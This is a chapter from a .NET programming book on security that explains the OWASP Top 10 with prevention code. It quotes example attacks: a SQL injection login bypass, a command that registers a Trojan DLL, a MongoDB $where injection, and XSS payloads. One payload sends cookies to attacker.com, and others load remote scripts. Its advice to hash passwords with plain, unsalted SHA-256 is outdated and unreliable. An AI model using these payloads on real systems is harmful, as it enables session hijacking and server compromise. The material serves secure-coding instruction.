<html><head></head><body><div class="chapter" title="Chapter&#xA0;11.&#xA0;Security" id="aid-1TVKI1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11"/>Chapter 11. Security</h1></div></div></div><p>In the previous chapter, we saw some of the most applied and used principles about software design, design patterns, and the way they are implemented or can be used in the .NET Framework.</p><p>In this chapter, we're going to study security issues and recommendations; or measures to take in order to build and deploy secure applications. We'll also look at how these security problems affect .NET applications.</p><p>Our starting point will be the <span class="strong"><strong>OWASP</strong></span> (<span class="strong"><strong>Open Web Application Security Project</strong></span>) proposal. OWASP is a security initiative that intends to offer, with a certain frequency, the latest on cyber security in terms of the types of possible flows, offering information about the best methods to deal with threats, prevention measures, and so on.</p><p>We'll focus our analysis on the definitions and prevention measures for the top 10 security threats published by the OWASP organization, their implications for the developer, and in case it applies, how these measures can be implemented in .NET Framework solutions.</p><p>In this chapter, we will cover the following topics:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">The OWASP initiative</li><li class="listitem">The OWASP top 10</li><li class="listitem">Injection</li><li class="listitem">Broken authentication and session management</li><li class="listitem">Cross-Site Scripting</li><li class="listitem">Insecure direct object references</li><li class="listitem">Security misconfiguration</li><li class="listitem">Sensitive data exposure</li><li class="listitem">Missing function-level access control</li><li class="listitem">Cross-site request forgery</li><li class="listitem">Using components with known vulnerabilities</li><li class="listitem">Invalidated redirects and forwards.</li></ul></div><div class="section" title="The OWASP initiative"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec59"/>The OWASP initiative</h1></div></div></div><p>The official definition of the <span class="strong"><strong>OWASP</strong></span> is as follows:</p><div class="blockquote"><blockquote class="blockquote"><p>"The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications that can be trusted."</p></blockquote></div><p>Initially, OWASP is thought to be a global set of guides and proposals about security, centralized and published by <a class="ulink" href="http://OWASP.org">OWASP.org</a>, a nonprofit organization focused on improving the security of software<a id="id944" class="indexterm"/> by making security visible, so organizations and individuals have a starting point that provides practical and impartial information about security issues.</p><p>Its official web page can<a id="id945" class="indexterm"/> be found at <a class="ulink" href="https://www.owasp.org/index.php/Main_Page">https://www.owasp.org/index.php/Main_Page</a>, and it offers guidelines about application security tools and standards as well as books, controls, and libraries, research on several security topics, worldwide conferences, mailing lists, and a long list of resources.</p><p>OWASP official site announces itself as an entity:</p><div class="blockquote"><blockquote class="blockquote"><p>"free from commercial pressures", which –in their own words- allow them to "provide unbiased, practical, cost-effective information about application security".</p></blockquote></div></div></div>
<div class="section" title="The OWASP Top 10"><div class="titlepage" id="aid-1UU542"><div><div><h1 class="title"><a id="ch11lvl1sec60"/>The OWASP Top 10</h1></div></div></div><p>Among the <a id="id946" class="indexterm"/>previously mentioned proposals, the so-called OWASP Top 10 is by far the most requested among programmers all over the world.</p><p>Its main goal is to help developers identify the most critical security risks facing organizations. To help in the task, they publish a periodical bulletin which has been published since they started in 2010. The current, updated version is the 2013 edition, although they're working on a version for 2017, which is not available at the time of writing this.</p><p>The top 10 vulnerabilities are presented in the following graphic. It assumes that the ordering is important, the first one being the most used or dangerous (or both, in many cases):</p><div class="mediaobject"><img src="../Images/image00645.jpeg" alt="The OWASP Top 10"/></div><p style="clear:both; height: 1em;"> </p><p>Also, keep in mind that often, an attack can be a compound of different steps, each step using some of these vulnerabilities (this happens in some of the most sophisticated attacks we know of).</p><p>In the diagram, OWASP<a id="id947" class="indexterm"/> explains a use case in which an actor gets access to a valuable resource and the elements involved in the process. Somehow, the vast majority of the attacks follow this sequence diagram:</p><div class="mediaobject"><img src="../Images/image00646.jpeg" alt="The OWASP Top 10"/></div><p style="clear:both; height: 1em;"> </p><p>As the paper states, the paths used by threat agents can be simple or tremendously complex. Often, they can be very difficult to identify and reproduce. They recommend the following:</p><div class="blockquote"><blockquote class="blockquote"><p>"To determine the risk to your organization, you can evaluate the likelihood associated with each threat agent, attack vector, and security weakness and combine it with an estimate of the technical and business impact to your organization. Together, these factors determine the overall risk."</p></blockquote></div><p>If you remember <a class="link" title="Chapter 10. Design Patterns" href="part0055.xhtml#aid-1KEEU1">Chapter 10</a>, <span class="emphasis"><em>Design Patterns</em></span>, there is a relation to the Threat Model, that is, basically, the same message we mentioned when talking about threats.</p><p>So, it seems that there's a consensus about security management and the principles that should be considered along the application's life cycle.</p><p>The top 10 list of threats that <a id="id948" class="indexterm"/>we are going to cover in this chapter explain the roots of every vulnerability, typical scenarios for attacks, and the recommended prevention measures. We'll review them and look at the ways in which they affect the C# and .NET programmers.</p><p>Let's start by quoting these<a id="id949" class="indexterm"/> ten definitions and establish them as the starting point of our analysis (there's a free version of the document available at <a class="ulink" href="http://www.owasp.org">http://www.owasp.org</a>):</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong>A1 - Injection:</strong></span> Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can<a id="id950" class="indexterm"/> trick the interpreter into executing unintended commands or accessing data without proper authorization.</li><li class="listitem"><span class="strong"><strong>A2 - Broken Authentication and Session Management Application</strong></span>: Application functions related to <a id="id951" class="indexterm"/>authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities.</li><li class="listitem"><span class="strong"><strong>A3 - Cross-Site Scripting (XSS)</strong></span>: XSS flaws occur whenever an application takes untrusted data and<a id="id952" class="indexterm"/> sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim's browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</li><li class="listitem"><span class="strong"><strong>A4 - Insecure Direct Object References</strong></span>: A direct object reference occurs when a developer exposes a reference to an inter<a id="id953" class="indexterm"/>nal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.</li><li class="listitem"><span class="strong"><strong>A5 - Security Misconfiguration</strong></span>: Good security requires having a secure configuration defined and<a id="id954" class="indexterm"/> deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.</li><li class="listitem"><span class="strong"><strong>A6 – Sensitive Data Exposure</strong></span>: Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may<a id="id955" class="indexterm"/> steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.</li><li class="listitem"><span class="strong"><strong>A7 – Missing Function Level Access Control</strong></span>: Most web applications verify function level access rights before making that functionality visible in the UI. However, applications <a id="id956" class="indexterm"/>need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.</li><li class="listitem"><span class="strong"><strong>A8 - Cross-Site Request Forgery (CSRF)</strong></span>: A CSRF attack forces a logged-on victim's browser to send a forged HTTP request, including the victim's session cookie and any other automatically included authentication information, to a vulnerable <a id="id957" class="indexterm"/>web application. This allows the attacker to force the victim's browser to generate requests that the vulnerable application thinks are legitimate requests from the victim.</li><li class="listitem"><span class="strong"><strong>A9 - Using Components with Known Vulnerabilities</strong></span>: Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a <a id="id958" class="indexterm"/>vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.</li><li class="listitem"><span class="strong"><strong>A10 – Unvalidated Redirects and Forwards</strong></span>: Web applications frequently redirect and forward<a id="id959" class="indexterm"/> users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.</li></ul></div><p>As we can see, there are 10 distinct areas to care about, which we should consider as programmers, although the team in charge of envisioning and planning the application should also keep them in mind from the very beginning of any software project.</p><p>So, let's go with the A1 threat, which is the mother of all evil for many programmers: injection in its many flavors.</p></div>
<div class="section" title="A1 &#x2013; injection"><div class="titlepage" id="aid-1VSLM2"><div><div><h1 class="title"><a id="ch11lvl1sec61"/>A1 – injection</h1></div></div></div><p>The injection threat is always based on input data from the user. An interpreter will take this information <a id="id960" class="indexterm"/>and, presumably, incorporate the data into the normal flow of a sentence that is to be executed behind the scenes.</p><p>So, the key here is that<a id="id961" class="indexterm"/> potential attacks should know the engine they're trying to surpass. However, the three main engines mentioned by A1 are SQL, OS, and LDAP, the first one being the most common (and that's why it's the most dangerous).</p><div class="section" title="SQL injection"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec116"/>SQL injection</h2></div></div></div><p>SQL injection is, perhaps, the<a id="id962" class="indexterm"/> most well-known of them all. It's based on some characteristics of the SQL language:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Several sentences can be linked together, separated by a semicolon (<code class="literal">;</code>)</li><li class="listitem">You can insert an inline comment with a double dash (<code class="literal">--</code>)</li><li class="listitem">The programmer doesn't care about the contents introduced by the user and adds those contents to a string that is passed to the interpreter, which blindly executes the command:<div class="mediaobject"><img src="../Images/image00647.jpeg" alt="SQL injection"/></div><p style="clear:both; height: 1em;"> </p></li></ul></div><p>As you can see in the figure, you just have to pass the sentence <code class="literal">or 1=1 --</code> to make it work. If the final sentence is something like <code class="literal">Select [User] from [Users] where [Password] = whatever</code>, although you don't include the right password, the following sentence is true, since <code class="literal">1 = 1</code> is true, and whatever the programmer put next to it is ignored due to the double dash comment. So, you're validated and you get into the system. Many other possibilities or variations are also possible but are always based on the same idea. The risk can be enormous, since they can even concatenate or delete sentences or even call stored procedures, such as <code class="literal">xp_cmsShell</code>, which executes sentences in the target system, thus getting total control over it.</p><p>In the worst case, it<a id="id963" class="indexterm"/> can even insert a Trojan inside the machine. Imagine the Trojan is called <code class="literal">xp_tr.dll</code> and that it's located in our <code class="literal">C:\temp</code> directory. We can use a sentence like this (next to the previous code):</p><div class="informalexample"><pre class="programlisting">master..sp_addextendedproc 'xp_webserver ', 'c:\temp\xp_tr.dll'—</pre></div><p>This will register our Trojan as a stored procedure, which we will call using <code class="literal">xp_webserver</code>, from that moment obtaining the functionality installed therein.</p></div><div class="section" title="Prevention"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec117"/>Prevention</h2></div></div></div><p>The defense? Don't trust any input from the user <a id="id964" class="indexterm"/>and therefore utilize a parsing mechanism that forces the coming string to be what you expect. As you can see, the problem goes beyond the type of application: it could be a desktop application or a website: the problem is always the same.</p><p>So, any data input is potentially evil. It doesn't matter who's coming from or where. That's what OWASP calls a threat agent.</p><p>The are three main strategies for defense against these kind of attacks:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Use parameterized queries, also called prepared statements</li><li class="listitem">Use stored procedures</li><li class="listitem">Escape all input coming from the user</li></ul></div><p>Let's take a look at how the first case looks:</p><div class="informalexample"><pre class="programlisting">// Case 1
var connection = newOleDbConnection();
string query =
"SELECT account_balance FROM user_data WHERE user_name = ?";
try
{
  OleDbCommand command = newOleDbCommand(query, connection);
  command.Parameters.Add(newOleDbParameter("customerName", txtCustomerName.Text));
  OleDbDataReader reader = command.ExecuteReader();
  // …
}
catch (OleDbException ex)
{
  // Give some exception information
}</pre></div><p>In this case, the potential dangerous parameter is created as a new <code class="literal">OleDbParameter object</code>, and that would not be possible if the user inserts a string not suitable for the task. This can be said for other types of parameters, such as <code class="literal">SQLParameter</code> if the client is <code class="literal">SQLClient</code>.</p><p>The second solution is to use stored procedures. As long as the programmer doesn't include any unsafe stored procedure generation, the effect of parameterized queries is the same as in the previous case.</p><p>The following code <a id="id965" class="indexterm"/>assumes that there is a <code class="literal">SQLConnection</code> object available and there's a stored procedure object stored in the SQL server that the connection points to, named <code class="literal">sp_getAccountBalance</code>. The process of the creation of a new <code class="literal">SQLParameter</code> object goes through a similar check as the first case:</p><div class="informalexample"><pre class="programlisting">// Case 2
try
{
  SqlCommand command = newSqlCommand("sp_getAccountBalance", connectionSQL);
  command.CommandType = CommandType.StoredProcedure;
  command.Parameters.Add(newSqlParameter("@CustomerName", txtCustomerName.Text));
  SqlDataReader reader = command.ExecuteReader();
}
catch (Exception)
{
  throw;
  // Give some excepcion information
}</pre></div><p>The third case deals with escaping the input (or <span class="strong"><strong>White List Input Validation</strong></span>), which can be done in several ways. This<a id="id966" class="indexterm"/> could be the case when the table to be used is selected dynamically by the user. The best way to avoid risks in this scenario is to provide a white list of possible values, avoiding any other input.</p><p>This is equivalent to the usage of an <code class="literal">Enum</code> type, specifying the possible tables that the query is going to admit:</p><div class="informalexample"><pre class="programlisting">// Case 3
String tableName = "";
switch (tableName) { 
  case"Customers":
    tableName = "Customers";
  break;
  case"Balance":
    tableName = "Balance";
  break;
  // ...                
  default: thrownewInputValidationException(
    "Invalid Table Name");
}</pre></div><p>Besides the previous<a id="id967" class="indexterm"/> techniques, there are other specific solutions related to the<a id="id968" class="indexterm"/> distinct RDBMS. For SQL Server databases, a good article on the subject can be found at <a class="ulink" href="https://blogs.msdn.microsoft.com/raulga/2007/01/04/dynamic-sql-sql-injection/">https://blogs.msdn.microsoft.com/raulga/2007/01/04/dynamic-sql-sql-injection/</a>.</p></div><div class="section" title="The case for NoSQL databases"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec118"/>The case for NoSQL databases</h2></div></div></div><p>The official documentation offers some insights about possible attacks using SQL injection against non relational engines.</p><p>In the case of the MongoDB engine we examined in <a class="link" title="Chapter 7. NoSQL Database Programming" href="part0039.xhtml#aid-1565U1">Chapter 7</a>, <span class="emphasis"><em>NoSQL Database Programming</em></span>, the problem arises<a id="id969" class="indexterm"/> when an attacker is able to operate on the information passed using the <code class="literal">$where</code> operator, including some JavaScript code that can be parsed as part of the MongoDB query.</p><p>Consider the following example in which the code is passed directly into the MongoDB query without any checking:</p><div class="informalexample"><pre class="programlisting">db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits &lt; $userInput; } } ); </pre></div><p>The trick here lies in using special characters with a special meaning to the API behind the engine. An attacker can observe if the application is sanitizing the input by checking the results on including certain characters to observe whether that triggers an error.</p><p>The injection of special characters relevant to the target API language and observation of the results may allow a tester to determine if the application correctly sanitized the input. For example, within MongoDB, if a string containing any of the following special characters (<code class="literal">'</code> <code class="literal">"</code> <code class="literal">\</code> <code class="literal">;</code> <code class="literal">{</code> <code class="literal">}</code>) was passed without control, it would trigger a database error.</p><p>Nonetheless, since JavaScript is a fully featured language, it allows an attacker to manipulate data and also run arbitrary code. Imagine the following code being inserted into the <code class="literal">$userInput</code> variable mentioned in the previous code:</p><div class="informalexample"><pre class="programlisting">0; var date = new Date(); do { curDate = new Date(); } while (curDate - date &lt; 10000)</pre></div><p>The JavaScript code will be executed…</p><p>The previously mentioned resource in OWASP will give you clues and advice about other types of injections: LDAP Injection, XML Injection, Command Injection, ORM Injection, SSI (Server-side includes) Injection, and so on.</p><p>In general, the <span class="emphasis"><em>OWASP Testing Guide v4 Table of Contents</em></span> documentation<span class="emphasis"><em> </em></span>(<a class="ulink" href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents</a>) of the initiative is an <a id="id970" class="indexterm"/>exhaustive and updated source to analyze and look for guidance through the amazing <a id="id971" class="indexterm"/>number of attacks related to these types of security threats.</p></div></div>
<div class="section" title="A2 &#x2013; Broken Authentication and Session Management"><div class="titlepage" id="aid-20R682"><div><div><h1 class="title"><a id="ch11lvl1sec62"/>A2 – Broken Authentication and Session Management</h1></div></div></div><p>The problem here is related to identity and permissions. As the official definition states:</p><div class="blockquote"><blockquote class="blockquote"><p>"Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities."</p></blockquote></div><p>This is even worse when the false authenticated users are remote (the typical case) and therefore difficult to track.</p><p>The problems here are <a id="id972" class="indexterm"/>multiple:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">We might accept <a id="id973" class="indexterm"/>unwanted users (information and operation disclosure)<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">A variant of this is when an unwanted user gets administrator privileges, thus putting the whole system at risk</li></ul></div></li><li class="listitem">We might accept a user with credentials beyond the legitimate use of information for these credentials</li></ul></div><p>Generally speaking, we can say this is a problem of impersonation or elevation of privileges (either because the attacker has no privilege at all or because it raises itself to a superior level than originally intended).</p><div class="section" title="The causes"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec119"/>The causes</h2></div></div></div><p>There are several causes for this. The most widely<a id="id974" class="indexterm"/> recognized are as follows:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">User authentication is unprotected when stored (hashing or encryption should be used)</li><li class="listitem">Weakness of passwords may allow an attacker to gain access to a <span class="emphasis"><em>brute force</em></span> procedure (usually trying to get in using a list of known passwords that are most commonly used)</li><li class="listitem">Session IDs can be exposed via URLs, be vulnerable to session fixation, don't have a timeout, or they're not properly invalidated at logout time</li><li class="listitem">Of course, all this information is not sent over an encrypted connection</li></ul></div><p>This is perhaps the more popular attack of all, since it's very usual to find it in literature and movies about<a id="id975" class="indexterm"/> hacking (often over exaggerated, let's say).</p><p>It is usually seen next to other techniques of the so-called <span class="emphasis"><em>social engineering</em></span>, which is defined by Wikipedia as follows:</p><div class="blockquote"><blockquote class="blockquote"><p>psychological manipulation of people into performing actions or divulging confidential information.</p></blockquote></div><p>Many well-known hackers, such as Kevin Mitnick, are considered real masters in this art (he runs a cyber security company of his own now).</p><p>Of course, in the OWASP initiative, we can find abundant information about the best ways to cope with this threat depending on different scenarios.</p><div class="section" title="Prevention"><div class="titlepage"><div><div><h3 class="title"><a id="ch11lvl3sec72"/>Prevention</h3></div></div></div><p>What can we do to<a id="id976" class="indexterm"/> proactively prevent this type of attack? There are some well established measures:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">First, developers should always have a single set of strong authentication and session management controls available. Thus, authentication and session management should <a id="id977" class="indexterm"/>comply with the requirements established in OWASP <span class="strong"><strong>Application Security and Verification Standard</strong></span> (<span class="strong"><strong>ASVS</strong></span>) and areas V2 (Authentication) and V3 (Session Management).<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">The document is available at <a class="ulink" href="https://www.owasp.org/index.php/ASVS">https://www.owasp.org/index.php/ASVS</a> and has been recently updated (version 3.0.1 as of July 2016).</li></ul></div></li><li class="listitem">Developers should maintain a simple interface. Recommendations on this are widely explained in the ESAPI authenticator and user APIs.</li><li class="listitem">Although this belongs to the A3 type of threat, the consideration of possible Cross-Site Scripting should also be primordial in this case.</li></ul></div><p>The ASVS has three levels<a id="id978" class="indexterm"/> of prevention, <span class="strong"><strong>opportunistic</strong></span>, <span class="strong"><strong>standard</strong></span>, and <span class="strong"><strong>advanced</strong></span>.</p><p>The first level is said to be <a id="id979" class="indexterm"/>achieved when an application adequately defends against application security vulnerabilities tha<a id="id980" class="indexterm"/>t <a id="id981" class="indexterm"/>are easy to discover, and included in the OWASP Top 10 and other<a id="id982" class="indexterm"/> similar checklists (as defined in the official documentation (<a class="ulink" href="https://www.owasp.org/images/6/67/OWASPApplicationSecurityVerificationStandard3.0.pdf">https://www.owasp.org/images/6/67/OWASPApplicationSecurityVerificationStandard3.0.pdf</a>).</p><p>This type of protection seems adequate when there<a id="id983" class="indexterm"/> are no special risks in the assets the application manages or if the type of expected attacks will not go beyond the use of simple low effort techniques to identify easy-to-find and easy-to-exploit vulnerabilities.</p><p>Level 1 should be<a id="id984" class="indexterm"/> the minimum required for all applications.</p><p>The second level (standard) is obtained when we are defending against most of the risks associated with software today. It's typically appropriate for applications that handle significant business-to-business transactions, including those that process healthcare information, implement business-critical or sensitive functions, or process other sensitive assets, indicating the ASVS.</p><p>Finally, level 3 is reserved for applications where significant levels of security verification are required, such as those found in the areas of military, health and safety, critical infrastructure, and so on.</p><p>An organization could require ASVS level 3 in software that performs critical functions, where a failure might impact the operations and even the organization's survival.</p></div></div><div class="section" title=".NET coding for A2"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec120"/>.NET coding for A2</h2></div></div></div><p>In .NET programming, we have<a id="id985" class="indexterm"/> a bunch of possibilities to enforce security authentication and authorization as well as many other options, including special namespaces dedicated to security (<code class="literal">System.Security</code>) and cryptography (<code class="literal">System.Security.Cryptography</code>).</p><div class="section" title="Desktop applications"><div class="titlepage"><div><div><h3 class="title"><a id="ch11lvl3sec73"/>Desktop applications</h3></div></div></div><p>For desktop applications, the main security level is based on login, of course. This means that the only access to the application should be through a login window, launched at the beginning against a secure store system (preferably a database).</p><p>There is not much to say in this<a id="id986" class="indexterm"/> case, since it's all about avoiding any SQL injection in the way we saw in the previous point.</p><p>However, a couple of considerations should be measured. First, for those cases in which the application is simple and the password should be stored in the <code class="literal">app.config</code> file, the password needs encryption.</p><p>We can do this very easily, in many ways, using the .NET resources: for instance, we can access hashing and encryption classes already prepared for this usage.</p><p>The following sample code will give you an idea about how to use it:</p><div class="informalexample"><pre class="programlisting">publicstaticbyte[] HashPassword(string password)
{
 var provider = newSHA1CryptoServiceProvider();
  var encoding = newUnicodeEncoding();
  return provider.ComputeHash(encoding.GetBytes(password));
}</pre></div><p>However, the <a id="id987" class="indexterm"/>algorithm used here is not the most secure one, since it seems to have been compromised lately. So, it would be better to use a more advanced version such as <code class="literal">SHA256Managed</code>, instead. Consequently, the initialization of the provider should be done using the following code:</p><div class="informalexample"><pre class="programlisting">publicstaticbyte[] HashPassword256(string password)
{
  SHA256 mySHA256 = SHA256Managed.Create();
  var encoding = newUnicodeEncoding();
  return mySHA256.ComputeHash(encoding.GetBytes(password));
}</pre></div></div></div><div class="section" title="Web applications"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec121"/>Web applications</h2></div></div></div><p>When talking about the old ASP.NET Web Forms applications, the truth is that they implement security<a id="id988" class="indexterm"/> pretty well (all in the server):</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">To start with, there's something that server components do automatically: encoding HTML values and attributes so that they prevent XSS attacks, which we will discuss in the next point (A3)</li><li class="listitem">Besides, <code class="literal">ViewState</code> is also ciphered and validated in a way that it can avoid "tampering" form the post information</li><li class="listitem">Programmers have a <code class="literal">validaterequest</code> attribute available in the <code class="literal">@page</code> declaration, which can be used to catch suspicious data</li><li class="listitem">Another way to prevent attacks through injection is event validation in order to control invalid posted information</li></ul></div><p>However, in ASP.NET MVC, most of this functionality is not present. So, we have another set of choices to ensure these features.</p><p>To start with, when you create a new ASP.NET MVC application, you are offered some choices about authentication:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">No authentication</li><li class="listitem">Individual user accounts</li><li class="listitem">Work and school accounts</li><li class="listitem">Windows authentication</li></ul></div><p>The second choice (individual accounts) allows the user to authenticate via Facebook, Twitter, or Google accounts (or even another security mechanism).</p><p>The third choice is<a id="id989" class="indexterm"/> for applications that authenticate users with Active Directory, Microsoft Azure Active Directory, or Office 365. You can choose single or multiple organizations or on-premises infrastructure, as shown in the next screenshot:</p><div class="mediaobject"><img src="../Images/image00648.jpeg" alt="Web applications"/></div><p style="clear:both; height: 1em;"> </p><p>Of course, in <span class="strong"><strong>Windows Authentication</strong></span>, all users logged into the system are allowed to get in.</p><p>In case you opt for an individual authentication, the prototype project that Visual Studio creates for us gives us some clues about how to code it correctly.</p><p>If you take a look at the default project, you'll see there are several classes that implement all the management about identities, passwords, and so on. This is included in the <code class="literal">ManageControllers.cs</code> file, which is generated by the default project.</p><p>The preferred measure to take in this case is the use of attributes in those controllers that might compromise security. Attributes for authorization allow you to configure who's allowed to use the corresponding controller (or the action method if you want to get more granular control).</p><p>This code explains how to implement several security features:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">On the one hand, these methods marked with the <code class="literal">[HttpPost]</code> attribute are also marked with another attribute, <code class="literal">[AntiForgeryToken]</code>. This is used to prevent a type of attack related to the OWASP A8 (Cross-Site Request Forgery), and we will go over it later.</li><li class="listitem">Besides, the entire <code class="literal">ManageController</code> class is marked with the <code class="literal">[Authorize]</code> attribute. This attribute stops any non authorized user to access this method, and if an attempt is made to access it, an exception will be thrown. <code class="literal">Authorize</code> forces the application to repudiate any user that is not—both—authenticated and authorized.</li></ul></div><p>This attribute allows<a id="id990" class="indexterm"/> some customization by the programmer: you can indicate specific roles, specific users, or both, as shown in the following screenshot:</p><div class="mediaobject"><img src="../Images/image00649.jpeg" alt="Web applications"/></div><p style="clear:both; height: 1em;"> </p><p>Besides these measures, a look at the <code class="literal">AccountController</code> class shows several methods that are marked with security attributes as well. The class itself is marked with <code class="literal">AuthorizeAttribute</code>, but we find some methods marked with <code class="literal">[AllowAnonymous]</code> too. The reason is because some actions and controllers are skipped by <code class="literal">AuthorizeAttribute</code> during authorization and are intended to allow initial access to these methods.</p><p>As for the second way to authenticate, that is, via external logins provided by Google, Twitter, or Facebook, this is now possible thanks to <code class="literal">OAuth</code> and <code class="literal">OpenID</code>, two standards for authentication widely used in social networks.</p><p>The protocols associated with these standards were not easy to implement in the past because they are complex; also, some top providers are used to implement them with some differences. Fortunately, the MVC project template eases the way we can manage these options.</p><p>The following (commented) code appears just like this in the project in order to allow you to code these new options with these external providers (you'll find them in the <code class="literal">Startup.Auth.cs</code> file):</p><div class="informalexample"><pre class="programlisting">// Uncomment the following lines to enable logging in with third party
//login providers
//app.UseMicrosoftAccountAuthentication(
//  clientId: "",
//  clientSecret: "");

//app.UseTwitterAuthentication(
//  consumerKey: "",
//  consumerSecret: "");

//app.UseFacebookAuthentication(
//  appId: "",
//  appSecret: "");

//app.UseGoogleAuthentication(new GoogleOAuth2AuthenticationOptions()
//{
//   ClientId = "",
//  ClientSecret = ""
//});</pre></div><p>As you can see, each <a id="id991" class="indexterm"/>provider requires some kind of user and password combination, which you can save in the storage media selected for this purpose.</p><p>Finally, note that there are other attributes in relation to security that you might use: for example, you can force a callback from an external provider in order to use HTTPS instead of HTTP by adding the <code class="literal">[RequireHttps]</code> attribute, which is linked to the critical action method you want to protect.</p><p>In this manner, you have an extra layer of security with just a single attribute.</p></div></div>
<div class="section" title="A3 &#x2013; Cross-Site Scripting (XSS)" id="aid-21PMQ1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec63"/>A3 – Cross-Site Scripting (XSS)</h1></div></div></div><p>XSS is said to be one<a id="id992" class="indexterm"/> of the most problematic security issues due to the lack of knowledge about it and its lack of prevention among the developer's community.</p><p>This is quite simple in <a id="id993" class="indexterm"/>some of its implementations, though, and that's why it is so dangerous. There are three known forms of XSS attacks: stored, reflected, and DOM based.</p><p>One of the official examples of these attacks (reflected) presents the following code:</p><div class="informalexample"><pre class="programlisting">"&lt;input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'&gt;";</pre></div><p>That is, the pages build an input field based on a request. Also, an attacker can modify the page in this way:</p><div class="informalexample"><pre class="programlisting">'&gt;&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'.</pre></div><p>What happens? The inserted code reflects the requested information about a user to the attacker, or to say it as in the OWASP documentation:</p><div class="blockquote"><blockquote class="blockquote"><p>"This causes the victim's SessionID is sent to the attacker's website, allowing the attacker to hijack the user's current session."</p></blockquote></div><p>The stored version of XSS (there are many, though) is a typical type of attack related to any possible user input, such as a blog with user comments, and so on. The attacker's response is saved in the <a id="id994" class="indexterm"/>website's storage system, and that's why the name.</p><p>In this scenario, the first thing that an attacker will do is insert into the answer, a character that should be escaped to see whether, indeed, it is escaped (something like a <code class="literal">&lt;</code>, for example). If the character shows up (it is not escaped), it means that the programmer doesn't check input in the comments.</p><p>Now comes the tricky part: instead of just a humble <code class="literal">&lt;</code> sign, you can insert something like this:</p><div class="informalexample"><pre class="programlisting">&lt;iframe src="http://hackersite.com" height="400" width=500/&gt;</pre></div><p>Since this is to be rendered on the page with the rest of the contents, whatever you write will be inserted and shown also. Of course, it would be more evil if instead of using just an iframe, you<span class="strong"><strong> </strong></span>insert a script tag that loads some dangerous JavaScript:</p><div class="informalexample"><pre class="programlisting">"&gt;&lt;/a&gt;&lt;script src="http://dangerous_site.com"&gt;&lt;/script&gt;&lt;a href="</pre></div><p>This will remain unnoticed to the users since the new anchor tag doesn't contain any text and is unseen. This script will now run when any user visits the Web, sending the attacker the information that the JavaScript code is prepared to send.</p><p>Some authors call this technique passive injection as opposed to active injection, in which without knowing the risks, the user participates in the hacking process.</p><p>Finally, the DOM-based version of XSS uses DOM tags to perform their actions. These attacks modify tags that are known to search and load external content: <code class="literal">img</code>, <code class="literal">link</code>, <code class="literal">script</code>, <code class="literal">input</code>, <code class="literal">iframe</code>, <code class="literal">object</code>, and even <code class="literal">body</code>, <code class="literal">div</code>, or <code class="literal">table</code> with the excuse of changing the background property.</p><p>Here are some examples of these attacks:</p><div class="informalexample"><pre class="programlisting">&lt;!-- Different DOM Based attacks --&gt;
&lt;!-- External script --&gt;
&lt;scriptsrc=http://hackersite.com/xss.js&gt;&lt;/script&gt;
&lt;!-- &lt;link&gt; XSS --&gt;
&lt;linkrel="stylesheet"href="javascript:alert('XSS');"&gt;
&lt;!-- &lt;img&gt; XSS --&gt;
&lt;imgsrc="javascript:alert('XSS');"&gt;
&lt;!-- &lt;input&gt; XSS --&gt;
&lt;inputtype="image"src="javascript:alert('XSS');"&gt;
&lt;!-- &lt;object&gt; XSS --&gt;
